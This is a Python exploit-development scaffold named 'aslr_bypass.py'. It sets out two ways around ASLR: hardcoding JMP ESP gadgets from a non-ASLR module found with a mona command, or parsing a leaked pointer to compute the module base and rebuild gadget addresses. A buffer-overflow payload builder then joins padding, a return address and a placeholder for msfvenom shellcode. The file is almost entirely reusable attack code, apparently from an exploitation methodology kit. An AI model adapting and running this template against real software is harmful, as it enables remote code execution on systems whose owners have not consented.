#!/usr/bin/env python3
"""
aslr_bypass.py — ASLR bypass scaffolding.

Two modes:
  MODE A (non-ASLR module): just hardcode addresses from a module with ASLR=False.
          Nothing special needed — this file shows how to keep RVAs organized.
  MODE B (leak + compute):  parse a leaked pointer at runtime, compute module base,
          then rebuild every address as base + RVA.

Companion: 00-methodology/aslr-bypass-playbook.md
"""
import struct
import re

def p32(a): return struct.pack("<I", a)

# ── MODE A: non-ASLR module (preferred) ─────────────────────────────────────────
# Find via: !py mona jmp -r esp -cm aslr=false -cpb "..."
NONASLR_JMP_ESP = 0x625011af      # fixed across reboots because module isn't ASLR'd


# ── MODE B: leak-and-compute ────────────────────────────────────────────────────
# RVAs are constant even under ASLR; only the base moves. Record RVAs once in the
# debugger:  rva = absolute_addr - module_base
RVA = {
    "jmp_esp":       0x000110af,
    "pop_eax_ret":   0x00023abc,
    "virtualprotect_iat": 0x0004d000,
    # ... add every address you need as an RVA
}

# Offset of the symbol you actually LEAK, within the same module.
LEAKED_SYMBOL_RVA = 0x00001234


def compute_base_from_leak(leaked_addr: int) -> int:
    """base = leaked pointer - the RVA of whatever symbol you leaked."""
    return leaked_addr - LEAKED_SYMBOL_RVA


def addr(base: int, name: str) -> int:
    """Absolute runtime address of a recorded gadget/symbol for THIS run's base."""
    return base + RVA[name]


def parse_leak(response: bytes) -> int:
    """
    Adapt this to your leak primitive. Example: pull the first 0x00xxxxxx-looking
    4-byte little-endian pointer out of a response blob.
    """
    # e.g. format-string leak printed as hex text "0x00a51234":
    m = re.search(rb"0x([0-9a-fA-F]{6,8})", response)
    if m:
        return int(m.group(1), 16)
    # or a raw 4-byte pointer at a known offset:
    # return struct.unpack("<I", response[OFF:OFF+4])[0]
    raise ValueError("no pointer found in leak response — adapt parse_leak()")


def build_with_leak(base: int) -> bytes:
    """Assemble the real exploit using addresses computed for this run."""
    jmp_esp = addr(base, "jmp_esp")
    # ... use addr(base, "...") for each gadget
    shellcode = b"\x90" * 16 + b""          # msfvenom bytes
    OFFSET = 0
    buf  = b"A" * OFFSET + p32(jmp_esp) + shellcode
    return buf


if __name__ == "__main__":
    # Example end-to-end (MODE B):
    #   1) trigger leak, read response
    #   2) base = compute_base_from_leak(parse_leak(response))
    #   3) send build_with_leak(base)
    print("MODE A jmp esp:", hex(NONASLR_JMP_ESP))
    demo_leak = 0x00a51234
    b = compute_base_from_leak(demo_leak)
    print("computed base:", hex(b), "-> jmp_esp:", hex(addr(b, "jmp_esp")))
